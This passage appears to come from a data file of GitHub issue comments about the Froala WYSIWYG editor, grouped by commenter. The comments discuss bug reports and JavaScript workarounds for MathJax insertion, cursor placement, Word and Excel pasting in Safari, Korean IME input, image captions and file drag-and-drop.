rely on getHTML for submitting data instead,\" is not really the solution, since it happens in a <div></div> as well.\nIf I'm not doing something correctly prior to initializing the editor that I could be doing differently, I'm also open to that. But most (uglier) competing WYSIWYG editors handle this without batting an eyelash.\nI prefer to put my money in Froala, and have a gorgeous editor (hint, hint, @stefanneculai!).\n. @stefanneculai Awesome. Thanks!\n. ",

For this, use:\n```\n.on('editable.imageInserted', function (e, editor, img) {\nimg.css('border','2px solid red');\n\n})\n```\n;-)\n. Can't you change src ?\nimg.attr('src','newSrc');\n. Ok. I'm a bit long to understand. So we have the same issue. ;-) Welcome to the club. \nI already try something like\n$('.selector').on('editable.imageResizeEnd', function (e, editor, img) {\n    $('.froala-class img').each(function(){\n        if(img.width() < 300){ ...\n    });\n});\nBut without effect\u2026 Perhaps i made something wrong. However i prefer a native function\u2026\nSo i wait for the answer.\n. I have an eror too using Jquery on Firefox 50.1.0 Mac Os El Capitan:\nError : IndexSizeError: Index or size is negative or greater than the allowed amount\nScript : https://cdnjs.cloudflare.com/ajax/libs/froala-editor/2.4.0/js/plugins/code_view.min.js\nLine : 7\nColumn : 0\nStackTrace : IndexSizeError: Index or size is negative or greater than the allowed amount.

Thanks! \ud83d\udc4d . I am sorry to insist but the editor prevents writing in a dynamically created input field by clicking a button in the image editor. If I move this input field out of the popup (.fr-popup.fr-desktop.fr-ltr.fr-active) the input works. This is not an implementation issue.. No, i can't because images are smallest and it disappear too fast. Is there a documentation about this loader popup ? Can i add step to understand why my css conflict with this pop up ?\n\n.

    "zalos": "It has been a year so I figured I would check, has anyone figured a way to do this? We have a need for mathjax and the Froala editor is perfect for all our needs minus this. Even if its not officially supported has there been anyone who has a workaround?\n. Took a little bit of work, but I was able to get MathJax to work using an img. I used the approach from:\nhttp://stackoverflow.com/questions/34924033/convert-latex-mathml-to-svg-or-image-with-mathjax-or-similar\nI came up with: \nIn the index:\n``` javascript\n\n    window.MathJax = {\n        jax: [\"input/TeX\", \"output/SVG\"],\n        extensions: [\"tex2jax.js\", \"MathMenu.js\", \"MathZoom.js\"],\n        showMathMenu: false,\n        showProcessingMessages: false,\n        messageStyle: \"none\",\n        SVG: {\n            useGlobalCache: false\n        },\n        TeX: {\n            extensions: [\"AMSmath.js\", \"AMSsymbols.js\", \"autoload-all.js\"]\n        }\n    };\n\n\n```\nIn Froala Editor Plugin: \njavascript\nfunction insertMathJaxImage(mathText) {\n    var wrapper = document.createElement(\"div\");\n    wrapper.innerHTML = wrapper.innerHTML = '\\\\['+ mathText +'\\\\]';\n    MathJax.Hub.Queue([\"Typeset\", MathJax.Hub, wrapper]);\n    MathJax.Hub.Queue(function () {\n        var mathjaxSVG = wrapper.getElementsByTagName(\"svg\")[0];\n        mathjaxSVG.setAttribute(\"xmlns\", \"http://www.w3.org/2000/svg\");\n        var svg = mathjaxSVG.parentElement.innerHTML;\n        var image = new Image();\n        image.src = 'data:image/svg+xml;base64,' + window.btoa(unescape(encodeURIComponent(svg)));\n        image.onload = function () {\n            var canvas = document.createElement('canvas');\n            canvas.width = image.width;\n            canvas.height = image.height;\n            var context = canvas.getContext('2d');\n            context.drawImage(image, 0, 0);\n            var imgSrc = canvas.toDataURL('image/png');\n            options.editor.selection.restore();\n            options.editor.html.insert('<img src=\"' + imgSrc + '\"></img>');\n            wrapper = mathjaxSVG = svg = image = canvas = context = imgSrc = null;\n        };\n    });\n}\nwe convert the contents to strip out the img itself and replace with a data div on save and replace back on load.

Also safari is angry but I found a fix at stack overflow safari ns1\nmove the image.src below the image.onload declaration\nmodified to add:\n``` javascript\n$svg.find('use').each(function() {\n    var $use = $(this);\n    if ($use.attr('xmlns:xlink')) {\n        return false; //we dont need to modify it\n    }\n    $use.attr('xmlns:xlink', 'http://www.w3.org/1999/xlink'); //add these for safari\n});\nvar svgHtml = $svg.prop('outerHTML');\n//firefox fix\nsvgHtml = svgHtml.replace(' xlink=', ' xmlns:xlink=');\n// Safari xlink ns issue fix\nsvgHtml = svgHtml.replace(/ ns\\d+:href/g, ' xlink:href');\nimage.src = 'data:image/svg+xml;base64,' + window.btoa(svgHtml);\n```\n. @magician11 I do not have a demo as it's pretty involved with our internal software.

We are also trying to insert some special html into the editor that we'd like the user to not be able to edit (ie: a preformatted form), however when this attribute is used the item can't be deleted or moved. So it's essentially \"stuck\" where it was inserted unless you go into the code editor and manually remove.\nNot really user-friendly or intuitive that way :/. Hmm,\nThis isn't working at all. I've added the following and none of the console.logs even fire:\n``` javascript\n$('.editable').on('froalaEditor.initialized', function (e, editor) {\nconsole.log('working?

However now that it's in there, and I can confirm all the events are firing properly, the original issue still remains... The cursor is sporadic and I still can't really click and edit the URL with ease... am I missing something here?\n. @stefanneculai sorry about that. I've managed to put an example together on codepen, which should give you access to everything: http://codepen.io/ndimatteo/pen/ozdPpO\n. You can see that you can't consistently click on the icons after they're inserted and after inserting 2 icons the cursor jumps between them and you can't move the cursor after it, nor traverse the content in an expected way.\n. Hey guys, saw you pushed up to NPM so I was able to finally test this out.\nWhile it seems I can add more than one icon now without it going haywire, there's still some glaring issues unfortunately :(\n1. I can't get the cursor to go between the icons, so if I need to remove one or add a new one between two icons I can't without having to delete the entire thing, since the cursor just jumps to the line before when I try to navigate:\n   \n2. If I try to mitigate the above issue by putting a space after each insert, it goes haywire like it did before after the second insert by placing the cursor between the first and second with no way to get it to go at the end of the latest insert:\n   \n3. It also appears that the popup is showing up multiple times, layered on top of one another? Seems odd.\nAll-in-all I really hope we can come up with a solution here. It pains me that tinyMCE, with all of it's flaws, didn't have any issues adding something simple like this; yet we're encountering lots of issues here with froala just trying to insert some custom html links.\nThoughts?\n. hey @stefanneculai, yea I updated the .on(''froalaEditor.initialized') as you outlined and I'm using the latest on NPM.\nI can update the codepen we were referencing before so you can see if you want?\n. @stefanneculai sure, here's the updated pen: http://codepen.io/ndimatteo/pen/ozdPpO\nFor some reason with this stripped down version the link popup doesn't appear twice, but it absolutely does in our dev environment. Same issues otherwise.\nAlso appears you have to have some text typed out first before beginning to insert the icons, otherwise it for some reason throws them individually within their own <p> tags.\n. hey @stefanneculai thanks, this is reallyyyyy close!\nThe only issue I see is that if the icons are the first thing in the editor, I can't get the cursor to move in front of the first icon. Meaning, if I want to add text or something else before the icons I can't (without of course going into the code view and manually adding a new element before the icons).\nAny ideas there?\n. ",

Hi @stefanneculai  I don't think you are understanding the problem. I'm talking about html elements existing OUTSIDE of the froala editor. Your fiddle does not solve my problem.. Yes @stefanneculai  as i tried to explain to you i'm doing this for a reason and that is that most content can be editable in the Froala editor and therefore i need all changes to be contained within the fr-view container class to get the froala styling... However. not all editable content will be contained with its own html element in which case how do i hook this class without it affecting all other content on the page?  . OK thanks the problem comes when it is html that is inline html not block html. I need to somehow differentiate between the two and contain one within a span and the other within a div. I do still feel that if froala was applying a fr-* class to every element that it adds it would be easy to apply the froala styling to just the froala content... However for some reason this is not the case is there a reason for this?  . Is there somewhere I can go to read / understand why  froala ended up making these design decisions? thanks @stefanneculai . https://youtu.be/ioZCJSB1VPc  Hi Please see  video link. \nIt looks like for the most part as if the tables contextual menu is opening up first time after a hard refresh (Ctrl +f5) it is after closing and reopening the jQuery UI dialogue the issue occurs. The table sub menu appears to open behind the dialog therefore making it unusable.\n. Thanks @stefanneculai  that looks like it solves my problem. . HI I also noticed that it does not work on your own official documentation page (select arabic and then go to code view) https://www.froala.com/wysiwyg-editor/languages please fix!.

After adding pasteDeniedAttrs:['class','id'] in froala configuration , the text is copying in froala as desired.\n. @stefanneculai there is an issue again , if I add pasteDeniedAttrs:['class','id'] in froala configuration on pasting the editor controls are not being updated..

    "enkodellc": "@stefanneculai?  I started to build a plugin but if you have any insight on this it would be greatly appreciated.  It would be nice to view some of the plugins code before minification for more examples. \nAny tips on how to pass data to the directive / froala to be used in a plugin?\n. I want to be able to have a dropdown that when they select one of the items in the dropdown it injects text at the cursor. I have a predefined list of merge fields that users can insert the document they are creating.  So if they select \"Company\" merge field from the custom dropdown my code will insert \"[[Company]]\" for the user in the textarea at the cursor position. Later in my code I will replace the \"[[Company]]\" with another field.\nThe trick is the merge fields are different for each user as they can create their own merge fields so I want to be able to send the list of merge fields once the editor is created. Thanks.\n. If I buy the Advanced / OEM license and I cannot get the functionality to work and will not use the control can I get a refund? I see you offer 30% discount to people who create plugins but it seems by not supplying examples you are inhibiting development of new plugins.\n. Thanks I am not the greatest JS developer. I just refactored your font-size plugin and injected the js code within my controller then passed my merge fields as a scope and it worked... I will test it out a bit more now that I can do what I want and see if I can get my team on board with this versus textAngular.\n.

Hi,\nWas about to post the exact same issue for Mac/Safari. PDF viewer is Safari itself.. Hi @stefanneculai ,\nI think this issue should be reopened. Attached is a Word file with two random sentences, created on a Mac running macOS 10.3.4  with Word's latest version (16.12 180410). If you copy/paste the whole text from Word to Froala's home page demo editor on Safari 11.1, here is the result :\n\nAs you can see, some words are glued together, just like in the example @DenisaSurdu posted for Edge. The problem doesn't occur on Chrome, and is clearly not related to the Word paste plugin since the gluing happens with or without it.\nTest Froala Word paste.docx\n. Hi @stefanneculai,\nThank you for answering quickly. Unfortunately, it doesn't work : only plain text can be pasted. Furthermore, I noticed that html tags like <img> are also filtered, whatever the init settings. The only solution I have been able to figure is to downgrade to 2.7.2.\nYou can check it by copying some content with styles and images on any web page, and pasting it into Froala's homepage test editor : everything is correctly pasted if you're using Chrome, for example, but not Safari 11.1. I have verified it on 3 different Mac computers running the latest macOS version.. @stefanneculai I'm on the road and don't have access to it, but will send it to you by the end of the week-end.. @stefanneculai, here is a very short Word file that exhibits the first part of the problem on Safari. If you copy/paste the text, it will suppress the white space between words \"n\u00e9gative\" and \"exerc\u00e9\". This happens with and without the Word plugin :\nWord paste test 1.docx\nThe second example is made of the same text block repeated on a few pages. It will paste into Safari after approx. 1 minute if the Word plugin is activated, whereas Chrome (or Safari without the Word plugin) will treat it instantly :\nWord paste test 2.docx\nThe longer the text, the longer the wait on Safari. A 30-40 page text still works on Chrome with a very short delay, but Safari will just hang.\nHope this helps you track the problem.\n. ",

I can't reproduce the issue at all using a variety of VMs so I don't know if it's some exact combination of OS, Browser and MS Word version.\nMy \"fix\" which is reported as working by users previously having the missing spaces problem is simply:\njavascript\neditor.on('editable.onPaste', function (e, editor, html) {\n    return html.replace(/(?:&#13;&#10;|&#10;|&#13;|\\r\\n|\\r|\\n)/g, ' ');\n});\nThat is to say, replace all new line characters with a single space - I can imagine that might cause problems with other types of paste but we're mostly dealing with people copy pasting from MS Word.

    "euangoddard": "Fair enough. That's how I'm using it today\n. I'll have to find some video capture software, but will send the video when I've done it. I could do a series of screenshots as well if that helps\n. I'm using Ubuntu Gnome 14.04. I've tested it on OSX and it works fine as you say!\nThis is what the editor looks like immediately after step 3 on my computer.\n\n. Just checked and it's ficed!\n. Sure thing. Is there a CDN version of Froala I can point JSFiddle to?\n. With the following markup:\n<div id=\"parent\">\n  <div id=\"above\">Above</div>\n  <div id=\"editor\"><textarea></textarea></div>\n  <div id=\"below\"></div>\n</div>\nInitialize the editor on #editor textarea, then do:\n```\nvar editor = document.querySelector('#editor');\nvar parent = document.querySelector('#parent');\nparent.removeChild(editor);\nparent.appendChild(editor);\n```\nYou'll need a big enough page to have scrolling, but the toolbar will be in the wrong place after the move.\n. I had to inline the editor code as Chrome was complaining about an incorrect MIME type. This fiddle: http://jsfiddle.net/e4fm47bn/3/ shows the issue when the editor is moved both up and down (more noticeable going down).\n. @stefanneculai I managed to achieve this without needing that. See http://jsfiddle.net/e4fm47bn/3/ for details. I also suspect this issue will occur if the content above the editor changes in vertical height\n. Thanks so much for this!\n. I cannot reproduce this issue in Chrome 45 on Linux. However I have experienced very similar issues in that browser. On my machine every time I make a keystroke in the editor I get multiple HTTP requests for all the favicons on my site (it has a manifest.json which makes Chrome request these additional icons).\n\nIf I had to guess I'd say that the editor is creating a hidden iframe to do some off-screen processing. In development I have cache rules for my favicons will not go into Chrome's cache so when Chrome sees a new page for the current domain it tries to get the favicons from the server.\nI also don't have the entities script enabled in my version so I think that is a red herring.\n. I've been trying to debug this issue and added breakpoints in the Froala code for every time it interacts with or creates iframes and none of these seem to be the culprit for causing these requests.\n. I can imagine so as it's very hard to reproduce and I'd also guess that without the cache disabled it will be unnoticeable. Thanks for the update\n. I get this issue too, but when ever the editor is empty and it receives focus or a click I see the message in the console.\n. OK. Will do\n. I have created a Fiddle with code to as close as that I'm using and I don't get the message. I suspect it's something subtle and it's a log message not an error so it's not an issue for me.\n. I can confirm this happens in Chrome 45 on Linux. This must have been the root cause of the issue I experienced since my application can have multiple editors on the same page.\nIt doesn't happen in Firefox 41\n. @stefanneculai yes this has fixed the issue for me too\n. I can try this, but has anything changed around the sanitization routine between 2.0.3 (which I'm using) and master?\n. I cannot reproduce this either on your example pages so I'll take a look at the configuration option to see if I can isolate what is fundamentally different between my config and those\n. I checked this the other day when I raised the issue and it was the same behaviour, but now it appears to focus the URL field. I have quite a few of the default options for that dialog disabled so I wonder whether that makes a difference. The config is as follows:\n{\n            allowComments: false,\n            htmlAllowedAttrs: ['title', 'href', 'alt', 'src'],\n            htmlAllowedTags: ['p', 'h1', 'h2', 'h3', 'a', 'br', 'ol', 'ul', 'li', 'strong', 'em', 'a'],\n            paragraphFormat: {\n                n: 'Normal',\n                h1: 'Heading 1',\n                h2: 'Heading 2'\n            },\n            toolbarButtons: TOOLBAR_BUTTONS,\n            toolbarButtonsMD: TOOLBAR_BUTTONS,\n            toolbarButtonsSM: TOOLBAR_BUTTONS,\n            toolbarButtonsXS: [\n                'paragraphFormat',\n                'bold',\n                'italic',\n                'insertLink'\n            ],\n            charCounterCount: false,\n            heightMin: 100,\n            linkList: [],\n            linkInsertButtons: [],\n            linkEditButtons: ['linkOpen', 'linkEdit', 'linkRemove'],\n            linkStyles: {},\n            linkText: true,\n            linkAlwaysBlank: true,\n            toolbarInline: false,\n            toolbarSticky: false,\n            imagePaste: false,\n            spellcheck: true,\n            tabSpaces: false\n        }\n. I appreciate that it's hard for you to diagnose this if it can't be reproduced in any of your demos, but it is still broken for me. I'm using the downloaded (and paid for) package from your site without any modifications other than configuration so I think this is a genuine issue.\nI'm happy to try to debug this myself if you can give me some pointers where I might need to look for when the focus is attempted on the URL field in the dialog and then I can at least discount any obvious issues.\n.

    "mnichols": "I'd agree with @connect-technologies that the inability to continue a blockquote after carriage return is inadequate. People type quotes into an editor so it isn't a matter of \"editing the quote\" but rather trying to format it the way it was written/spoken. Longer quotes would naturally have paragraphs and so on. I am able to paste a quote having paragraphs into the editor but of course quotes arent always from digital media where that is possible. Why not permit Shift+Enter to insert a carriage return inside the quote?\n. I am using froala 2.0.5 and getting this same behavior . Here is a link to a vid of me reproducing: http://padlet.com/mike3/m6mtyubpt7kp/wish/87083625\nThis duplication only happens when creating a link with text (full word or partial) at end of a line having a carriage return.\n. @stefanneculai FYI I just confirmed this behavior occurs when linkText:false also except it actually inserts the url beside the original text.\n. I pulled in froala_editor.min.js and link.min.js and see they are at 2.0.6, but I still see the same duplication behavior.\nThe linkText:false behavior is broken also, where it actually prepends the URL before the link text. \n.

It has been resolved.\n. @open2 \nhttp://www.opencode.co.kr/qna/4993\nThis account is can not download a file.\ntest12\n\n. @stefanneculai \nThis has not yet been resolved.\nI tried to re-test the latest version.\nhttps://www.dropbox.com/s/iml3dowqkognrx0/typing5.mov?dl=0\n. @stefanneculai \nThanks for checking.\nI have the same idea, this is akin to the problem of IE11.\n(But, IME input problem is different from other editors...)\nI reduced the IME problem by following the steps below.\njavascript\n    $('#edit').on('froalaEditor.image.inserted', function (e, editor, $img, response) {\n        if(editor.browser.msie == true) $img.parent().after('<p><br></p>');\n    });\n@open2 \n1112\nWe can not improve any more problems. \n. @open2 @stefanneculai \nI can not reproduce the problem.\n(Sorry. can not Windows 7 test. but there is no problem in Windows 10.)\n- froala v2.3.4\n- chrome\n- windows 10\n. @stefanneculai \nI thought this problem was solved in #769.\nBut I think the issue is happening again.. Thanks!\nI found that file () is not supported by Safari.\nSo I searched the solution and I could solve it simply by doing the following.\njavascript\n//image.js\nfunction upload(...) {\n//...\n    // Set the image in the request.\n    if(typeof image.name == 'undefined') form_data.append(editor.opts.imageUploadParam, image, (new Date()).getTime()+'.jpg');\n    else form_data.append(editor.opts.imageUploadParam, image);\n//...\n}\nFor your reference, I'd like to add a few more options.\njavascript\n//image_aviary.js\n    function _initAviary() {\n      /*global Aviary*/\n      feather_editor = new Aviary.Feather({\n        apiKey: editor.opts.aviaryKey,\n        displayImageSize: true,\n        theme: editor.opts.avairyTheme,//add\n        language: editor.opts.language,//add. @stefanneculai \nI hope this option is used.\nbecause, clicking on the hr tag causes problems.\nAnd I am using it by adding code.\n```javascript\n//quick_insert.js\nfunction _checkTag () {\n// If editor has focus.\n  if (editor.core.hasFocus()) {\n    var tag = editor.selection.element();\n    // Add a quickInsertTags check.\nif($(tag.parentNode).hasClass('fr-element') || $.inArray(tag.parentNode.tagName.toLowerCase(), editor.opts.quickInsertTags) < 0) {\n    hide();\n    return;\n}\n\n```\nPlease review.\n. @stefanneculai \nI'm sorry I did not explain.\n\n(The default paragraph is the P tag)\nStep1.\nP Write the text in the paragraph and replace it with H1.\nStep2.\nPress return.\nThe div tag is displayed instead of the default paragraph P.\n(On the macbook, it appears as the default Paragraph P tag.)\nThe next video is talking about a solution and a new bug.\nBut please forget it now. :)\n. @stefanneculai \nThank you! =b\nI think that the problem that I pointed out at first is solved.\n\nHowever... if you press Enter after entering Korean, two lines may be created.\nThis is very rare and patterns are hard to find.\nThere is a feeling that it is canceled from the first word after entering the enter key.\n(At least it was not in v2.0.1)\nI think this issue has been resolved. close please.\nWhen the problem of Hangul becomes clear, I will register the issue again.. @stefanneculai \noh..\n\ntyping dot (.) And pressing enter, there are two lines... @stefanneculai \ud83d\udc4d \nall clear!\nKorean, Japanese, special characters, and English typing also works normally.\nThank you. :). @Wuyialex hello :p\nI am interested in this issue.\nBut I failed to reproduce the problem.\nWhat OS and browser issue are you having?\nFor reference, how about dragging with the mouse?. @Wuyialex \nThank you for a detailed explanation.\n@stefanneculai \nI found this problem to appear in the chrome safari.

Or any regular key.\n(The toolbar work.)\n\nIt seems to be a problem when only IME key is put on.\n. @stefanneculai \nI found the cause for this issue.\nWe define not to display the inline toolbar when the last typing is IME true.\nIf editor.keys.isIME () is removed, there is no problem in operation.\nHow about removing it?\njavascript\n// froala_editor.js\n    function showInline (e, force) {\n      setTimeout(function () {\n        if ((!e || e.which != $.FE.KEYCODE.ESC) && editor.selection.inEditor() && editor.core.hasFocus() && !editor.popups.areVisible()) {\n          if (editor.opts.toolbarVisibleWithoutSelection || (!editor.selection.isCollapsed() && !editor.keys.isIME()) || force) { //<- here !editor.keys.isIME()\n            editor.$tb.data('instance', editor);. @stefanneculai \nCould you check it again?\nAs I checked, the plugin will not work unless I add the code below.\njavascript\n//froala_editor.js\n    /**\n     * Process the pasted HTML.\n     */\n    function _processPaste () {\n///...\n      var is_word = clipboard_html.match(/(class=\\\"?Mso|class=\\'?Mso|style=\\\"[^\\\"]*\\bmso\\-|class=\\\"?Xl|class=\\'?Xl|class=Xl|style=\\'[^\\']*\\bmso\\-|w:WordDocument)/gi);\n// Add condition class=\\\"?Xl|class=\\'?Xl|class=Xl. I think Excel paste should be possible with the word_paste plugin.\nOf course, it works by copying an Excel sheet into Word and pasting it into the editor.\nHowever, you must be able to paste directly from the Excel sheet.\nIn addition, there is a problem that the height is omitted when pasting Excel.\nThis also needs to be improved.\nI've fixed this problem with the addition of the code below.\nIf this resolves, it will be a nicer plugin than ckeditor and tinymce. :p\n```javascript\n// word_paste.js\n  $.extend($.FE.DEFAULTS, {\n    wordDeniedTags: [],\n    wordDeniedAttrs: [],\n    wordAllowedStyleProps: ['font-family', 'font-size', 'background', 'color', 'width', 'height', 'text-align', 'vertical-align', 'background-color'],\n    wordPasteModal: true\n  });\n/*\n * Clean tr element.\n */\nfunction _cleanTr (tr, head_style_hash) {\n\n//...\n        // Store height attribute.\n        var height = child.getAttribute('height');\n    if (!height && style) {\n      var height_matches = style.match(/height:.+?[; \"]{1,1}/gi);\n\n      if (height_matches) {\n        height = height_matches[height_matches.length - 1].replace(/height:(.+?)[; \"]{1,1}/gi, '$1');\n      }\n    }\n\n//...\n        // Add height to style.\n        if (height) {\n          child.style['height'] = height;\n        }\n//...\n```\n. @stefanneculai \nsorry. I thought my case might be special.\ncase1.\nWord will work correctly with style paste.\nBut Excel does not work with style paste.\n\ncase2.\nAdd condition class=\\\"?Xl|class=\\'?Xl|class=Xl\n\ncase3.\nCss style Height does not apply\noption\nwordAllowedStyleProps: ['font-family', 'font-size', 'background', 'color', 'width', 'height', 'text-align', 'vertical-align', 'background-color'],\n\n\nword, we copied it to ctrl + C.\ncase4.\nadding code.\n\nword, we copied it to ctrl + C.. @stefanneculai \ud83d\udc4d \ud83d\udc4d\nPerfect!. @stefanneculai \nThank you.

The code below is the cause of the problem.\n$el.wrap('');. @stefanneculai \nI think the current  operation method is no problem, but I think the behavior of image captions should be similar to the quote plugin behavior.\nmedium.com also uses figure figcaption.. @stefanneculai \nI will explain a more detailed example of the use of the caption of the image I think.\n\nI think the use of figure tag is correct if I use the caption of the image for only the type A pattern.\nBut if you need to use the pattern of Type B, I think you need to use span tag.\nWhen using Type A (figure tag), the following operation method is required.\nStep1\nI have the following conditions and I want to use captions for IMG tag.\nhtml\n<p>text text text text <img src=\"image.jpg\">text text text text text </p>\nStep2\nWraps the IMG tag with a figure tag and replace it into a paragraph.\nhtml\n<p>text text text text</p>\n<figure><img src=\"image.jpg\"><figcaption>image caption</figcaption></figure>\n<p>text text text text text </p>\nStep3\nIf you remove the image caption, the figure tag is replaced with the p tag.\nhtml\n<p>text text text text</p>\n<p><img src=\"image.jpg\"></p>\n<p>text text text text text </p>. @FinesseRus The code of the last pattern of B type I am saying is as follows. I think that in this case the figure tag should not be used and the span tag should be used.\nhtml\n<p>\n    <span class=\"fr-img-caption fr-fic fr-draggable fr-dii\" contenteditable=\"false\" draggable=\"false\">\n        <span class=\"fr-img-wrap\" style=\"width: 200px;\">\n            <img src=\"image.jpg\" alt=\"Editor photo\" style=\"width: 200px;\" class=\"fr-fil fr-dib\">\n            <span class=\"fr-inner\" contenteditable=\"true\">Image caption</span>\n        </span>\n    </span>\n    <img src=\"image.jpg\" alt=\"Editor photo\" class=\"fr-fic fr-dii\" style=\"width: 200px;\">\n    <img src=\"image.jpg\" alt=\"Editor photo\" class=\"fr-fic fr-dii\" style=\"width: 200px;\">\n</p>\n<p>\n    <img src=\"image.jpg\" alt=\"Editor photo\" style=\"width: 200px;\" class=\"fr-fic fr-dii\">\n    <img src=\"image.jpg\" alt=\"Editor photo\" class=\"fr-fic fr-dii\" style=\"width: 200px;\">\n    <span class=\"fr-img-caption fr-fic fr-draggable fr-dii\" contenteditable=\"false\" draggable=\"false\">\n        <span class=\"fr-img-wrap\" style=\"width: 200px;\">\n            <img src=\"image.jpg\" alt=\"Editor photo\" style=\"width: 200px;\" class=\"fr-fil fr-dib\">\n            <span class=\"fr-inner\" contenteditable=\"true\">Image caption</span>\n        </span>\n    </span>\n</p>\n\n. @stefanneculai \nSorry.\nMy explanation was not good.\nI am talking about a very minor problem.\nThis may be something that others will not care about.\nThis symptom appears on all OSs and browsers.\nWhen I perform commands.undo, commands.redo as below, I see the phenomenon that the height is shaken by the _cleanOnGet() function of the embedly plugin.\n\nI chose to specify a height for the .fr-embedly element to solve this.\njavascript\n  embedly('on', 'card.resize', function(iframe){\n    $card_parent = $(iframe).parents('.fr-embedly');\n    $card_parent.css('height', $card.height());\n  });\n\nIf there is a willingness to improve, it is safe to apply overflow: hidden as well.. Hi,\nI have found the cause of this problem. (It may have been solved by @stefanneculai  already.)\nThis problem will occur on all browsers except mozilla.\n```javascript\n// image.js\nfunction toggleCaption () {\n//...\n    $el.wrap(''); <- here\n//...\n}\nfunction _syncImages (loaded) {\n//...\n    if (c_images[i].parentNode && c_images[i].parentNode.parentNode && editor.node.hasClass(c_images[i].parentNode.parentNode, 'fr-img-caption')) {\n      var p_node = c_images[i].parentNode.parentNode;\n  if (!editor.browser.mozilla) { <- here\n    p_node.setAttribute('contenteditable', false);\n  }\n\n  p_node.setAttribute('draggable', false);\n  p_node.classList.add('fr-draggable');\n\n//...\n}\n```. \nThis is a picture after the bug has been improved.\nI have found a definite cause.\nThis problem occurs when the parent has contenteditable = \"false\" and the child has contenteditable = \"true\".\nimage.js treats the parent as contenteditable = \"false\" in non-Firefox browsers.. @igiz0l \nThe symptoms of the picture are not the bugs I mentioned. It's another bug.\nWe have confirmed that this symptom occurs in Windows environment.\nSymptoms were not found on the Mac.. @igiz0l @stefanneculai \nhello.\nI have found the cause of the align problem.\njavascript\n//plugins/align.js\n  $.FE.PLUGINS.align = function (editor) {\n    function apply (val) {\n//...\n      // Wrap.\n      editor.selection.save();\n      editor.html.wrap(true, true, true, true); // <- here\n      editor.selection.restore();\n//...\nThe fourth value is wrap processing of .fr-inner\nFor the caption, the fourth value should be false to avoid the problem.\nException handling of the _wrap() is required.\njavascript\n//froala_editor.js\n    /**\n     * Wrap the direct content inside the default block tag.\n     */\n    function _wrap (temp, tables, blockquote, inner) {\n//...\n      if (inner) {\n        _wrapElements(editor.el.querySelectorAll('.fr-inner:not(span)'), temp);\n      }\n//..\n    }. @stefanneculai \nThis is caused by the following code.\nI was able to fix the problem by removing the code below.\nHowever, if you remove the code, the toolbar will not appear on PC mode.\njavascript\n// froala_editor.js\nfunction _initInlineBehavior () {\n//...\n    editor.events.on('window.mouseup', showInline); <- here\n//...\n}\nSolution\njavascript\n// froala_editor.js\nfunction _initInlineBehavior () {\n//...\n    if (!editor.helpers.isMobile()) {\n      editor.events.on('window.mouseup', showInline);\n    }\n//...\n}. @stefanneculai \nThis is my idea for solving this problem.\nThe problem is actually resolved.\n```javascript\n//froala_editor.js\n$.FE.MODULES.popups = function (editor) {\n//...\n    function _build (id, template) {\n//...\n      if (editor.opts.zIndex > 1) {\n        if (!editor.opts.editInPopup) {\n            editor.$tb.css('z-index', editor.opts.zIndex + 2);\n          } else {\n            $popup.css('z-index', editor.opts.zIndex + 2);\n          }\n      }\n//...\n    }\n//...\n  }\n```. This is different on windows and mac.\nwindows 10 chrome:\nDrag and drop the file into the editor and the will move to the file download or file view.\nmac high sierra chrome:\nIt looks like the attached screen.\nThis is because file.js performs image type checking and unnecessary extension checking at the same time.\nfull.html tested.. \nmac high sierra / firefox\n@stefanneculai \nPlease check again.\nI just created a video with the version you just committed.\nI made the following settings.\n```html\n\n\n\n\n\n\n\n\n    $(function(){\n      $('#edit').froalaEditor({\n        fileAllowedTypes: ['application/pdf']\n      })\n    });\n  \n```\nThis symptom has nothing to do with image.js.\nThis is a problem because file.js does not do anything if it is not mime type allowed.\nIf the type is not image or video, you must perform upload () and the error should be indicated by the filter.. 8c7146d Commit did not resolve the symptom...\n<p><img src=\"data:text/plain;base64,66Gc66eI64Sk7Iqk7YGsIOu4lOuhnOq3uCDsiqTtgqgg7JWI64K0DQ3snbQg7YyM7J287J2AIOuhnOuniOuEpOyKpO2BrCDruJTroZzqt7gg7Iqk7YKoIO2MqO2CpOyngOyXkCDtj6ztlajrkJjripQg7JWI64K066y4IOyeheuLiOuLpC4NDeyKpO2CqCDsgqzsmqnsnYQg7JyE7ZW07ISc64qUIOuPhOuplOyduOyXkCDtlbTri7ntlZjripQg65287J207ISg7IqkIO2CpOqwgCDtlYTsmpTtlanri4jri6QuDeyVhOyngSDsiqTtgqjsnYQg6rWs66ek7ZWY7KeAIOyViuycvOyFqOuLpOuptCDslYTrnpjrpbwg7Ya17ZW0IOq1rOunpCDqsIDriqXtlanri4jri6QuDWh0dHBzOi8vcm9tYW5lc3F1ZS5tZS82MjY3DQ3siqTtgqjsnYQg6rWs66ek7ZWY7IugIOq1rOunpOyekOuKlCDslYTrnpjsnZgg7KO87IaM66GcIOygkeyGje2VmOyLnOqzoCDqtazrp6Qg7IOB7ZKIIOuplOuJtOyXkOyEnCDrnbzsnbTshKDsiqQg7YKk66W8IOuwnOq4iSDrsJvsnLzshLjsmpQuDWh0dHBzOi8vcm9tYW5lc3F1ZS5tZS9hY2NvdW50DQ3shKTsuZjrgpgg7IKs7Jqp67Cp67KV7JeQIOuMgO2VtOyEnOuKlCDslYTrnpjsnZgg7J207JqpIOqwgOydtOuTnOulvCDsnb3slrTrs7TshLjsmpQuDWh0dHBzOi8vcm9tYW5lc3F1ZS5tZS82MjIyDQ3qtoHquIjtlZjsi6Ag7IKs7ZWt7J2AIOyVhOuemOydmCDsg4Hri7Qg6rKM7Iuc7YyQ7Jy866GcIOuCqOqyqOyjvOyEuOyalC4NaHR0cHM6Ly9yb21hbmVzcXVlLm1lL2NvbnRhY3QNDS0NUm9tYW5lc3F1ZS5pbw==\" alt=\"\"></p>. \n```javascript\n// file.js\n    function _drop (e) {\n  // Check if we are dropping files.\n  var dt = e.originalEvent.dataTransfer;\n\n  if (dt && dt.files && dt.files.length) {\n    var file = dt.files[0];\n\n    if (file && typeof file.type != 'undefined') {\n\n      // Dropped file is an file that we allow.\n      if (file.type.indexOf('image') < 0) {\n        if (!editor.opts.fileUpload) {\n          e.preventDefault();\n          e.stopPropagation();\n\n          return false;\n        }\n    //...\n}\n\n```\nSimply do not do a file check from drop (), we can get the result we assumed.\n.

